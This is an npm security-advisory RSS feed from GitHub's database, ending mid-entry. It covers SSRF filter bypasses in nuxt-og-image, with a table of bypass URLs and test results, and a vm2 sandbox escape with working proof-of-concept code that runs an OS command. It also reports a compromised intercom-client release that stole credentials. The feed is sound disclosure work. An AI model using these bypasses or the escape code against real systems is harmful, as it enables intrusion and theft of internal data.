<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-05-08T08:27:49.073Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mcp-ssh-tool] mcp-ssh-tool has file transfer path policy bypass and bearer token comparison hardening]]></title>
        <id>https://github.com/advisories/GHSA-j7h9-2jh7-g967</id>
        <link href="https://github.com/advisories/GHSA-j7h9-2jh7-g967"/>
        <updated>2026-05-07T21:45:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>mcp-ssh-tool</code> has released version <code>2.1.1</code> with security hardening for transfer path authorization and HTTP bearer authentication.</p>
<p>The release addresses:</p>
<ul>
<li>insufficient local path policy enforcement in transfer-related filesystem handling</li>
<li>incomplete canonicalization and segment-boundary handling for deny-prefix path policy checks</li>
<li>non-constant-time HTTP bearer token comparison</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Affected versions may allow policy bypass in transfer path handling under specific configurations, and may expose a timing side channel in bearer-token comparison for HTTP deployments.</p>
<h2 id="patched-version">Patched Version</h2>
<p>Upgrade to <code>mcp-ssh-tool &gt;= 2.1.1</code>.</p>
<pre><code class="language-bash">npm install -g mcp-ssh-tool@latest
</code></pre>
<h2 id="workarounds">Workarounds</h2>
<p>For deployments that cannot immediately upgrade:</p>
<ul>
<li>avoid exposing HTTP transport beyond loopback</li>
<li>use strict filesystem policy configuration</li>
<li>avoid granting MCP clients access to sensitive local transfer paths</li>
<li>monitor audit logs for unexpected transfer operations</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Reported by <code>dodge1218</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/oaslananka/mcp-ssh-tool/security/advisories/GHSA-j7h9-2jh7-g967">https://github.com/oaslananka/mcp-ssh-tool/security/advisories/GHSA-j7h9-2jh7-g967</a></li>
<li><a href="https://github.com/advisories/GHSA-j7h9-2jh7-g967">https://github.com/advisories/GHSA-j7h9-2jh7-g967</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j7h9-2jh7-g967</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T21:45:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sublinear-time-solver] sublinear-time-solver has a Path Traversal Issue]]></title>
        <id>https://github.com/advisories/GHSA-gc2j-wpjv-jhrw</id>
        <link href="https://github.com/advisories/GHSA-gc2j-wpjv-jhrw"/>
        <updated>2026-05-07T21:09:00.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in ruvnet sublinear-time-solver 1.5.0. Affected by this vulnerability is the function export_state of the file src/consciousness-explorer/mcp/server.js of the component MCP Interface. The manipulation results in path traversal. The attack can be executed remotely. The exploit has been made public and could be used. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7645">https://nvd.nist.gov/vuln/detail/CVE-2026-7645</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/issues/19">https://github.com/ruvnet/sublinear-time-solver/issues/19</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver">https://github.com/ruvnet/sublinear-time-solver</a></li>
<li><a href="https://vuldb.com/submit/806895">https://vuldb.com/submit/806895</a></li>
<li><a href="https://vuldb.com/vuln/360757">https://vuldb.com/vuln/360757</a></li>
<li><a href="https://vuldb.com/vuln/360757/cti">https://vuldb.com/vuln/360757/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-gc2j-wpjv-jhrw">https://github.com/advisories/GHSA-gc2j-wpjv-jhrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc2j-wpjv-jhrw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-02T18:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nuxt-og-image] nuxt-og-image SSRF — bypass of GHSA-pqhr-mp3f-hrpp / v6.2.5 fix (IPv6 + redirect)]]></title>
        <id>https://github.com/advisories/GHSA-c2rm-g55x-8hr5</id>
        <link href="https://github.com/advisories/GHSA-c2rm-g55x-8hr5"/>
        <updated>2026-05-07T20:52:33.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>isBlockedUrl()</code> denylist introduced in <code>nuxt-og-image@6.2.5</code> to remediate <strong>GHSA-pqhr-mp3f-hrpp</strong> (Dmitry Prokhorov / Positive Technologies, March 2026) is incomplete. The patch advisory states "Decimal/hexadecimal IP encoding bypasses are also handled" — that part is true (Node's WHATWG URL parser canonicalizes those forms before validation), but the v6.2.5 implementation misses two independent surfaces in the latest release <code>6.4.8</code>:</p>
<ol>
<li><p><strong>IPv6 prefix list is incomplete.</strong> The IPv6 branch checks only <code>bare === "::1" || startsWith("fc") || startsWith("fd") || startsWith("fe80")</code>. It misses:</p>
<ul>
<li><code>[::ffff:7f00:1]</code> — IPv6-mapped IPv4 loopback in pure-hex form (RE_MAPPED_V4 regex requires dotted-quad). <strong>Reaches 127.0.0.1 on a single-stack-IPv4 host with no other primitive needed.</strong></li>
<li><code>[fec0::/10]</code> (RFC 3879 site-local — deprecated but still routable on legacy networks)</li>
<li><code>[5f00::/16]</code> (RFC 9602 SRv6 SIDs)</li>
<li><code>[3fff::/20]</code> (RFC 9637 IPv6 documentation v2)</li>
<li><code>[64:ff9b:1::/48]</code> (RFC 8215 NAT64 local-use, including embedded IPv4 loopback <code>[64:ff9b:1::7f00:1]</code>)</li>
</ul>
</li>
<li><p><strong>No redirect re-validation.</strong> <code>isBlockedUrl</code> runs once on the initial <code>&lt;img src&gt;</code>. The subsequent <code>$fetch(decodedSrc, ...)</code> (ofetch, default redirect-follow) follows 30x responses with no second-pass validation. Any allowed origin that returns a 302 to an internal IP — S3 redirect rules, GCS, Azure, CloudFront, any user-content CDN where the attacker can place a single redirect — completes the SSRF.</p>
</li>
</ol>
<p>The net result is that the v6.2.5 SSRF advisory is bypassable in two distinct ways. The same root family as #29 / #38 (ipx) but in a <strong>different code path with different gaps</strong> — <code>nuxt-og-image</code> does not delegate to <code>ipx</code>, it ships its own validator, and that validator has fresh issues that survived the prior fix.</p>
<h2 id="affected">Affected</h2>
<table>
<thead>
<tr>
<th>Package</th>
<th>Version</th>
<th>Role</th>
</tr>
</thead>
<tbody><tr>
<td><code>nuxt-og-image</code></td>
<td><code>6.4.8</code> (latest)</td>
<td>default OG-image generator for Nuxt apps</td>
</tr>
<tr>
<td><code>@nuxtjs/og-image</code> (alias)</td>
<td>same</td>
<td>re-export, same code path</td>
</tr>
</tbody></table>
<p>The vulnerable code lives in <code>dist/runtime/server/og-image/core/plugins/imageSrc.js</code> and is enforced for every <code>&lt;img src&gt;</code> (and <code>style="background-image: url(...)"</code>) inside an OG image component, on production builds (<code>!import.meta.dev</code>).</p>
<h2 id="vulnerable-code-imagesrcjs-verbatim">Vulnerable code (<code>imageSrc.js</code>, verbatim)</h2>
<pre><code class="language-js">function isPrivateIPv4(a, b) {
  if (a === 127) return true;
  if (a === 10) return true;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return true;
  if (a === 192 &amp;&amp; b === 168) return true;
  if (a === 169 &amp;&amp; b === 254) return true;
  if (a === 0) return true;
  return false;
}
function isBlockedUrl(url) {
  let parsed;
  try { parsed = new URL(url); } catch { return true; }
  if (parsed.protocol !== "http:" &amp;&amp; parsed.protocol !== "https:") return true;
  const hostname = parsed.hostname.toLowerCase();
  const bare = hostname.replace(RE_IPV6_BRACKETS, "");
  if (bare === "localhost" || bare.endsWith(".localhost")) return true;
  const mappedV4 = bare.match(RE_MAPPED_V4);   // /^::ffff:(\d+\.\d+\.\d+\.\d+)$/
  const ip = mappedV4 ? mappedV4[1] : bare;
  const parts = ip.split(".");
  if (parts.length === 4 &amp;&amp; parts.every((p) =&gt; RE_DIGIT_ONLY.test(p))) {
    /* dotted-decimal IPv4 path */
  }
  if (RE_INT_IP.test(ip)) {
    /* single-integer IPv4 path */
  }
  if (bare === "::1" || bare.startsWith("fc") || bare.startsWith("fd") || bare.startsWith("fe80"))
    return true;                                  // ← gap: only 4 IPv6 prefixes
  return false;                                   // ← everything else is "public"
}

// Then:
async function doResolveSrcToBuffer(src, kind, ctx) {
  ...
  if (!import.meta.dev &amp;&amp; isBlockedUrl(decodedSrc)) {
    return { blocked: true };
  }
  const buffer = await $fetch(decodedSrc, {     // ← follows 30x by default
    responseType: "arrayBuffer",
    timeout: fetchTimeout,
  });
  ...
}
</code></pre>
<p>Two distinct issues:</p>
<ul>
<li><strong>The IPv6 prefix list is hand-rolled</strong> (<code>fc</code>, <code>fd</code>, <code>fe80</code>, <code>::1</code>) and inherits no taxonomy from <code>ipaddr.js</code> or any RFC table.</li>
<li><strong><code>$fetch</code> is <code>ofetch</code></strong>, which wraps Node <code>fetch()</code> with default <code>redirect: "follow"</code>. The validator does not run on the redirect target.</li>
</ul>
<h2 id="reproducer-verbatim-no-host-privilege">Reproducer (verbatim, no host privilege)</h2>
<p>End-to-end test of <code>isBlockedUrl</code> on a corpus of internal-IP forms, paired with empirical <code>fetch()</code> confirming which forms actually reach loopback. Verbatim output:</p>
<pre><code>  isBlockedUrl?  fetch reaches loopback?  url
  -------------  -----------------------  ---
  ✓ blocked      YES                      http://127.0.0.1:8765/             (control: dotted-decimal loopback)
  ✓ blocked      YES                      http://localhost:8765/             (control)
  ✓ blocked      no(ECONNREFUSED)         http://[::1]:8765/                 (control: IPv6 loopback)
  ✓ blocked      no(EHOSTUNREACH)         http://169.254.169.254:8765/       (control: AWS IMDS)
  ✓ blocked      YES                      http://2130706433:8765/            (control: decimal-int IPv4)
  ✓ blocked      YES                      http://0x7f000001:8765/            (control: hex-int IPv4)
  ✓ blocked      YES                      http://0177.0.0.1:8765/            (control: octal — URL parser canonicalizes)
  ✓ blocked      YES                      http://127.1:8765/                 (control: shorthand — URL parser canonicalizes)

  ✗ NOT blocked  YES                      http://[::ffff:7f00:1]:8765/       (BYPASS: IPv6-mapped, hex form)
  ✗ NOT blocked  no(unreachable)          http://[fec0::1]:8765/             (BYPASS: RFC 3879 site-local)
  ✗ NOT blocked  no(unreachable)          http://[5f00::1]:8765/             (BYPASS: RFC 9602 SRv6)
  ✗ NOT blocked  no(unreachable)          http://[3fff::1]:8765/             (BYPASS: RFC 9637 docs)
  ✗ NOT blocked  no(unreachable)          http://[64:ff9b:1::1]:8765/        (BYPASS: RFC 8215 NAT64)
  ✗ NOT blocked  no(unreachable)          http://[64:ff9b:1::7f00:1]:8765/   (BYPASS: NAT64 + embedded loopback)
</code></pre>
<p>The first six bypass rows say "✗ NOT blocked" — that is <code>isBlockedUrl</code> returning <code>false</code> (i.e., "this URL is fine to fetch") for each of those addresses. The "fetch reaches loopback" column shows that <code>[::ffff:7f00:1]</code> actually round-trips to 127.0.0.1 on a single-stack-IPv4 dev box; the four cluster ranges are unreachable on the dev box but succeed on dual-stack / k8s / NAT64 / SRv6 networks where any of these prefixes is internally bound.</p>
<p>The "control" rows confirm the bypass set is minimal — the validator catches the obvious cases. The bypasses are the cases the prefix list forgot.</p>
<h3 id="class-2-redirect-amplifier">Class 2: redirect amplifier</h3>
<p><code>$fetch(url, { responseType: "arrayBuffer", timeout })</code> follows 30x by default. Confirmed empirically — <code>ofetch('http://lab.menna.website/test/redirect-to-loopback')</code> (where <code>lab.menna.website</code> returns <code>302 Location: http://127.0.0.1/</code>) ends with <code>&lt;no response&gt; fetch failed</code> after the connect attempt to <code>127.0.0.1:80</code>, proving the redirect was followed. On a target where the redirect destination has a service bound, the bytes round-trip back through the OG renderer.</p>
<p>Same primitive as #29 / #38 (ipx redirect bypass), in a different validator. The fix recommendations for #29 also apply here, with the same trade-offs.</p>
<h2 id="impact">Impact</h2>
<p>A Nuxt application that uses <code>nuxt-og-image</code> (the official-recommended OG generator) and includes any user-influenced URL in an OG component is vulnerable to SSRF that returns the bytes of the internal response as part of the rendered OG image:</p>
<ul>
<li><strong>Class 1 directly:</strong> <code>&lt;img src="http://[::ffff:7f00:1]:PORT/path"&gt;</code> reaches 127.0.0.1 on the OG worker. If the dev's deployment has anything bound to loopback (admin dashboards, internal HTTP-RPC, Redis HTTP UI, anything running alongside the function on the same machine in self-hosted setups), it leaks.</li>
<li><strong>Class 1 cluster:</strong> the IPv6 cluster ranges trigger only on dual-stack / k8s / NAT64 networks — but those are exactly the production targets where SSRF matters most.</li>
<li><strong>Class 2 redirect:</strong> any allowed CDN with a redirect rule extends the reach to all RFC 1918 / loopback / link-local space.</li>
</ul>
<p><code>nuxt-og-image</code> is the OG-image module recommended in Nuxt's official documentation; it is shipped with Nuxt UI templates and is one of the top-2 Nuxt modules by GitHub stars. The user-facing primitive in real apps is "title/avatar comes from a request param" — exactly the same <code>&lt;NuxtLink to="/og?avatar=..."&gt;</code> pattern Nuxt docs encourage.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Three non-exclusive options:</p>
<ol>
<li><p><strong>Replace the hand-rolled IPv6 prefix list with <code>ipaddr.js</code>'s <code>range()</code> predicate</strong> (or equivalent), then either:</p>
<ul>
<li>explicitly deny the four cluster ranges that <code>ipaddr.js</code> currently misses (<code>fec0::/10</code>, <code>5f00::/16</code>, <code>3fff::/20</code>, <code>64:ff9b:1::/48</code>), or</li>
<li>wait for the <code>ipaddr.js</code> upstream patch (see Vercel #27 — same gap, separately disclosed) and bump.</li>
<li>In any case, also catch <code>[::ffff:7f00:1]</code> either by widening <code>RE_MAPPED_V4</code> or by classifying any <code>::ffff:</code> address as the embedded IPv4.</li>
</ul>
</li>
<li><p><strong>Pass <code>redirect: "manual"</code> in <code>$fetch</code> defaults</strong> and reject 3xx. (Compare <code>astro:assets</code>, which already does this — <code>await fetch(url, { redirect: "manual" })</code> and explicit 3xx-rejection.)</p>
</li>
<li><p><strong>Pin the validated IP to the connection.</strong> Resolve the hostname once during validation, then pass a custom <code>undici.Agent</code> with <code>connect.lookup</code> returning the resolved IP only. This closes both the IPv6 bypass class (the resolved IP is checked again) and the redirect class (post-30x lookup is forced to the original IP). Reference: <code>request-filtering-agent</code> on npm.</p>
</li>
</ol>
<p>(2) alone closes Class 2. (1) alone closes Class 1. (3) closes both with one change.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nuxt-modules/og-image/security/advisories/GHSA-c2rm-g55x-8hr5">https://github.com/nuxt-modules/og-image/security/advisories/GHSA-c2rm-g55x-8hr5</a></li>
<li><a href="https://github.com/advisories/GHSA-c2rm-g55x-8hr5">https://github.com/advisories/GHSA-c2rm-g55x-8hr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c2rm-g55x-8hr5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-07T20:52:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yii2-mcp-server] yii2-mcp-server has a Command Injection Issue]]></title>
        <id>https://github.com/advisories/GHSA-gc8w-x73w-p4rh</id>
        <link href="https://github.com/advisories/GHSA-gc8w-x73w-p4rh"/>
        <updated>2026-05-07T20:51:52.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw has been found in ArtMin96 yii2-mcp-server 1.0.2. This impacts the function yii_command_help/yii_execute_command of the file src/index.ts of the component MCP Interface. Executing a manipulation can lead to os command injection. The attack can be executed remotely. The exploit has been published and may be used. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7600">https://nvd.nist.gov/vuln/detail/CVE-2026-7600</a></li>
<li><a href="https://github.com/ArtMin96/yii2-mcp-server/issues/3">https://github.com/ArtMin96/yii2-mcp-server/issues/3</a></li>
<li><a href="https://github.com/BruceJqs/public_exp/issues/29">https://github.com/BruceJqs/public_exp/issues/29</a></li>
<li><a href="https://github.com/ArtMin96/yii2-mcp-server">https://github.com/ArtMin96/yii2-mcp-server</a></li>
<li><a href="https://vuldb.com/submit/805613">https://vuldb.com/submit/805613</a></li>
<li><a href="https://vuldb.com/vuln/360557">https://vuldb.com/vuln/360557</a></li>
<li><a href="https://vuldb.com/vuln/360557/cti">https://vuldb.com/vuln/360557/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-gc8w-x73w-p4rh">https://github.com/advisories/GHSA-gc8w-x73w-p4rh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc8w-x73w-p4rh</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-02T03:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[intercom-client] Compromised version of intercom-client published to npm]]></title>
        <id>https://github.com/advisories/GHSA-54pg-9963-v8vg</id>
        <link href="https://github.com/advisories/GHSA-54pg-9963-v8vg"/>
        <updated>2026-05-07T17:32:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>On April 30, 2026, version 7.0.4 of intercom-client was published to npm using credentials obtained from a compromised developer account. This version was not produced by Intercom's build pipeline.</p>
<p>The malicious version contained an obfuscated JavaScript payload that executed during package installation via a preinstall hook. The payload harvested credentials from the environment in which it ran, including cloud provider credentials (AWS, GCP, Azure), environment variables, .env files, GitHub and npm tokens, SSH keys, local configuration files, and cloud metadata service credentials.</p>
<p>Harvested data was exfiltrated to attacker-controlled GitHub repositories. The package was live on npm for approximately 2 hours (15:00-17:00 UTC).</p>
<p>This compromise is part of the "Mini Shai-Hulud" supply chain campaign tracked by Wiz and Socket.</p>
<p>Developers can check if their projects are affected by running: <code>npm list intercom-client</code>. If it shows 7.0.4, the project is affected.</p>
<h3 id="patches">Patches</h3>
<p>Version 7.0.3 and all prior versions are unaffected. Downgrade to 7.0.3 immediately.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If a developer installed version 7.0.4 on any machine or CI system, treat all credentials accessible from that environment as compromised and rotate them. Check lock files (<code>package-lock.json</code>, <code>yarn.lock</code>, <code>pnpm-lock.yaml</code>) for references to 7.0.4. Review CI/CD build logs for any <code>npm install</code> that resolved to 7.0.4 between 15:00 and 17:00 UTC on April 30, 2026.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://socket.dev/blog/intercom-s-npm-package-compromised-in-supply-chain-attack">https://socket.dev/blog/intercom-s-npm-package-compromised-in-supply-chain-attack</a></li>
<li><a href="https://www.intercomstatus.com/us-hosting/incidents/01KQFN6VS6ARP1XBR1K1SBYY59">https://www.intercomstatus.com/us-hosting/incidents/01KQFN6VS6ARP1XBR1K1SBYY59</a></li>
<li><a href="https://www.wiz.io/blog/mini-shai-hulud-supply-chain-sap-npm">https://www.wiz.io/blog/mini-shai-hulud-supply-chain-sap-npm</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intercom/intercom-node/security/advisories/GHSA-54pg-9963-v8vg">https://github.com/intercom/intercom-node/security/advisories/GHSA-54pg-9963-v8vg</a></li>
<li><a href="https://github.com/advisories/GHSA-4594-wxqv-j3pm">https://github.com/advisories/GHSA-4594-wxqv-j3pm</a></li>
<li><a href="https://socket.dev/blog/intercom-s-npm-package-compromised-in-supply-chain-attack">https://socket.dev/blog/intercom-s-npm-package-compromised-in-supply-chain-attack</a></li>
<li><a href="https://www.intercomstatus.com/us-hosting/incidents/01KQFN6VS6ARP1XBR1K1SBYY59">https://www.intercomstatus.com/us-hosting/incidents/01KQFN6VS6ARP1XBR1K1SBYY59</a></li>
<li><a href="https://www.wiz.io/blog/mini-shai-hulud-supply-chain-sap-npm">https://www.wiz.io/blog/mini-shai-hulud-supply-chain-sap-npm</a></li>
<li><a href="https://github.com/advisories/GHSA-54pg-9963-v8vg">https://github.com/advisories/GHSA-54pg-9963-v8vg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54pg-9963-v8vg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-07T17:32:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: Zalo replay dedupe keys could suppress messages across chats or senders]]></title>
        <id>https://github.com/advisories/GHSA-6477-wvjj-47v6</id>
        <link href="https://github.com/advisories/GHSA-6477-wvjj-47v6"/>
        <updated>2026-05-07T16:44:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-rxmx-g7hr-8mx4. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.4.2 contains an insufficient scope vulnerability in Zalo webhook replay dedupe keys that allows legitimate events from different conversations or senders to collide. Attackers can exploit weak deduplication scoping to cause silent message suppression and disrupt bot workflows across chat sessions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rxmx-g7hr-8mx4">https://github.com/openclaw/openclaw/security/advisories/GHSA-rxmx-g7hr-8mx4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41354">https://nvd.nist.gov/vuln/detail/CVE-2026-41354</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/ef7c553dd16ee579f1d1a363f5881a99726c1412">https://github.com/openclaw/openclaw/commit/ef7c553dd16ee579f1d1a363f5881a99726c1412</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-insufficient-scope-in-zalo-webhook-replay-dedupe-keys">https://www.vulncheck.com/advisories/openclaw-insufficient-scope-in-zalo-webhook-replay-dedupe-keys</a></li>
<li><a href="https://github.com/advisories/GHSA-6477-wvjj-47v6">https://github.com/advisories/GHSA-6477-wvjj-47v6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6477-wvjj-47v6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-24T00:31:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cinny] Cinny vulnerable to access token disclosure via invalidated emoji pack avatar URL in service worker]]></title>
        <id>https://github.com/advisories/GHSA-j944-w549-3453</id>
        <link href="https://github.com/advisories/GHSA-j944-w549-3453"/>
        <updated>2026-05-07T16:40:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A remote authenticated attacker who shares a room with a victim and has permissions to create room emotes (for example in a DM) can cause the victim's client to send their Matrix access token to an attacker-controlled server. This occurs when the victim opens the emoji or sticker picker for the room containing a malicious emote pack. </p>
<p>The root causes are: </p>
<p>(1) an incorrect fallback in EmojiBoard that uses untrusted <code>pack.meta.avatar</code> (user-controlled) without converting/validating it as an MXC URL, allowing arbitrary HTTP(S) URLs to be used; and </p>
<p>(2) the service worker attaching the user's Authorization bearer token to all outbound GET requests whose URL contains <code>/_matrix/client/v1/media/download</code> or <code>/_matrix/client/v1/media/thumbnail</code> without verifying the request host matches the configured homeserver origin. An attacker-controlled URL containing those path fragments and permissive CORS will receive the victim's Authorization header (access token). </p>
<p>Impacted users: anybody using affected Cinny web app versions who opens the emoji/sticker picker in a room containing a malicious emote pack and who is logged in (authenticated).</p>
<h3 id="patches">Patches</h3>
<p>Version with fixes: <a href="https://github.com/cinnyapp/cinny/releases/tag/v4.10.3">https://github.com/cinnyapp/cinny/releases/tag/v4.10.3</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cinnyapp/cinny/security/advisories/GHSA-j944-w549-3453">https://github.com/cinnyapp/cinny/security/advisories/GHSA-j944-w549-3453</a></li>
<li><a href="https://github.com/advisories/GHSA-j944-w549-3453">https://github.com/advisories/GHSA-j944-w549-3453</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j944-w549-3453</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T16:40:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vm2] vm2 NodeVM `nesting: true` bypasses `require: false` allowing sandbox escape and arbitrary OS command execution]]></title>
        <id>https://github.com/advisories/GHSA-8hg8-63c5-gwmx</id>
        <link href="https://github.com/advisories/GHSA-8hg8-63c5-gwmx"/>
        <updated>2026-05-07T05:13:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When a <code>NodeVM</code> is created with <code>nesting: true</code>, sandbox code can unconditionally <code>require('vm2')</code> regardless of the outer VM's <code>require</code> configuration — including <code>require: false</code>. With access to <code>vm2</code>, the sandbox constructs a new inner <code>NodeVM</code> with its own unrestricted <code>require</code> settings and executes arbitrary OS commands on the host. Any application that runs untrusted code inside a <code>NodeVM</code> with <code>nesting: true</code> is fully compromised.</p>
<h3 id="details">Details</h3>
<p>The vulnerability is in how the <code>nesting: true</code> option interacts with the legacy module resolver.</p>
<p><strong><code>lib/nodevm.js:96-99</code></strong> — <code>NESTING_OVERRIDE</code> is a special builtin map that injects the <code>vm2</code> package into the sandbox:</p>
<pre><code class="language-js">const NESTING_OVERRIDE = Object.freeze({
  __proto__: null,
  vm2: vm2NestingLoader
});
</code></pre>
<p><strong><code>lib/nodevm.js:268-269</code></strong> — When <code>nesting: true</code>, this override is passed into the resolver factory alongside the host's <code>require</code> options:</p>
<pre><code class="language-js">const customResolver = requireOpts instanceof Resolver;
const resolver = customResolver ? requireOpts : makeResolverFromLegacyOptions(
  requireOpts,
  nesting &amp;&amp; NESTING_OVERRIDE,  // ← injected when nesting:true
  this._compiler
);
</code></pre>
<p><strong><code>lib/resolver-compat.js:193-197</code></strong> — This is the vulnerable branch. When <code>require: false</code> is set, <code>requireOpts</code> is falsy, so <code>!options</code> is true. Without nesting the function returns <code>DENY_RESOLVER</code> (block everything). With nesting, it instead builds a resolver that includes <code>vm2</code> from <code>NESTING_OVERRIDE</code>:</p>
<pre><code class="language-js">function makeResolverFromLegacyOptions(options, override, compiler) {
  if (!options) {
    if (!override) return DENY_RESOLVER;  // require:false, no nesting → deny all
    // BUG: require:false + nesting:true reaches here
    // override (NESTING_OVERRIDE) is applied, making vm2 available
    const builtins = makeBuiltinsFromLegacyOptions(undefined, defaultRequire, undefined, override);
    return new Resolver(DEFAULT_FS, [], builtins);  // vm2 is now requireable
  }
  // ...
}
</code></pre>
<p><strong><code>lib/builtin.js:102-106</code></strong> — <code>NESTING_OVERRIDE</code> is merged unconditionally into builtins, overriding any user-configured allowlist:</p>
<pre><code class="language-js">if (overrides) {
  const keys = Object.getOwnPropertyNames(overrides);
  for (const key of keys) {
    res.set(key, overrides[key]);  // vm2 always injected when nesting:true
  }
}
</code></pre>
<p>The result: <code>require('vm2')</code> always succeeds inside a <code>NodeVM</code> with <code>nesting: true</code>, regardless of <code>require: false</code>, <code>require: { builtin: [] }</code>, or any other restriction. Once the sandbox has <code>vm2</code>, it creates a new inner <code>NodeVM</code> with whatever <code>require</code> config it chooses — unconstrained by the outer VM — and reaches <code>child_process</code>.</p>
<p>This was introduced in commit <code>2353ce60</code> (Feb 8, 2022) and survived a major refactor in commit <code>9e2b6051</code> (Apr 8, 2023). The JSDoc for <code>nesting</code> does warn that "scripts can create a NodeVM which can require any host module," but does not document that <code>nesting: true</code> silently defeats <code>require: false</code>, which is the non-obvious part of this interaction.</p>
<h3 id="poc">PoC</h3>
<p><strong>Requirements:</strong> vm2 installed, Node.js v22.22.1 (also reproduced on earlier versions).</p>
<pre><code class="language-js">const { NodeVM } = require('vm2');

// Host intends: nesting enabled, but require completely disabled
const vm = new NodeVM({ nesting: true, require: false });

const result = vm.run(`
  // Step 1: require('vm2') succeeds despite require:false on the outer VM
  const { NodeVM: NVM } = require('vm2');

  // Step 2: create an inner NodeVM with attacker-chosen require config
  // This inner VM has no relation to the outer VM's restrictions
  const inner = new NVM({ require: { builtin: ['child_process'] } });

  // Step 3: execute arbitrary OS command in the inner VM
  module.exports = inner.run(
    'module.exports = require("child_process").execSync("id").toString()'
  );
`);

console.log(result);
// uid=1000(akshat) gid=1000(akshat) groups=1000(akshat),4(adm),...
</code></pre>
<p><strong>Observed output (confirmed on Node v22.22.1, vm2 commit <code>8dd0591</code>):</strong></p>
<pre><code>uid=1000(akshat) gid=1000(akshat) groups=1000(akshat),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),104(kvm),118(lpadmin),989(docker),990(ollama),991(nordvpn)
</code></pre>
<p>The variant with <code>require: false</code> also works — the outer VM's require setting has no effect:</p>
<pre><code class="language-js">new NodeVM({ nesting: true, require: false }).run(`
  const { NodeVM: NVM } = require('vm2');
  module.exports = new NVM({ require: { builtin: ['child_process'] } })
    .run('module.exports = require("child_process").execSync("id").toString()');
`);
// uid=1000(akshat) ...
</code></pre>
